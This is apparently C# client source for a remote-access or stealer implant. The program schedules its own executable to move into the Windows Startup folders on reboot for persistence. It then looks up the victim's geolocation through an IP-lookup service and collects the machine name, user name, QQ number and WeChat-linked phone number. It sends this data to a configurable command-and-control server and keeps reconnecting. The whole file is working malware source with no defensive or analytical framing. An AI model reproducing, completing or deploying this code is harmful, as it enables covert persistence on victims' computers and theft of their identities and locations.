using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

class Program
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool MoveFileEx(
      string lpExistingFileName,
      string lpNewFileName,
      uint dwFlags);

    private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;
    public static TCPClient client;
    public static void AutoRun()
    {
        string sourceFilePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

        string userStartupFolderPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Startup),
            Path.GetFileName(sourceFilePath)
        );

        string commonStartupFolderPath = Path.Combine(
            @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
            Path.GetFileName(sourceFilePath)
        );

        MoveFileEx(sourceFilePath, userStartupFolderPath, MOVEFILE_DELAY_UNTIL_REBOOT);
        MoveFileEx(sourceFilePath, commonStartupFolderPath, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
    static async Task Main(string[] args)
        {
            AutoRun();

            //string serverAddress = "{IPADDRESS}";
            //int serverPort = {PORT};
            string serverAddress = "127.0.0.1";
            int serverPort = 2026;
            client = new TCPClient(serverAddress, serverPort);
            string phone = await GetWeChatInfo.Get();

            var dlInfo = new HttpClient();
            var ipInfo = "";
            try
            {
                ipInfo = await dlInfo.GetStringAsync(new Uri("http://208.95.112.1/line/?fields=61439?fields=status,country,region,regionName,city,lat,lon,mobile,proxy,query&lang=zh-CN"));
            }
            catch { }
            string CITY = "NONE", XY = "NONE", IP = "NONE";

            var Infos = ipInfo.Split("\n");
            if (Infos.Length > 5)
            {
                CITY = $"{Infos[0]}-{Infos[2]}-{Infos[3]}";
                XY = $"[{Infos[4]}][{Infos[5]}]";
                IP = Infos[8];
            }

            while (true)
            {
                try
                {
                    await client.ConnectAndSend($"INFO|||" +
                        $"DNAME-{Environment.MachineName}|||" +
                        $"UNAME-{Environment.UserName}|||" +
                        $"PNAME-{Process.GetCurrentProcess().ProcessName}|||" +
                        $"CNAME-NONE|||" +
                        $"DATE-{DateTime.Now:yyyy-MM-dd-HH:mm}|||" +
                        $"CITY-{CITY}|||" +
                        $"PID-{Process.GetCurrentProcess().Id}|||" +
                        $"QQ-{GetQQNumber.Get()}|||" +
                        $"XY-{XY}|||" +
                        $"PHONE-{phone.Split('\0')[0]}|||" +
                        $"KEY-NONE|||" +
                        $"KEYTYPE-NONE");

                    while (client.IsConnected)
                    {
                        await Task.Delay(4000);
                    }

                    Console.WriteLine("连接已断开，重新尝试连接...");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"连接失败: {ex.Message}, 5秒后重试...");
                }
                await Task.Delay(5000);
            }
        }
    }
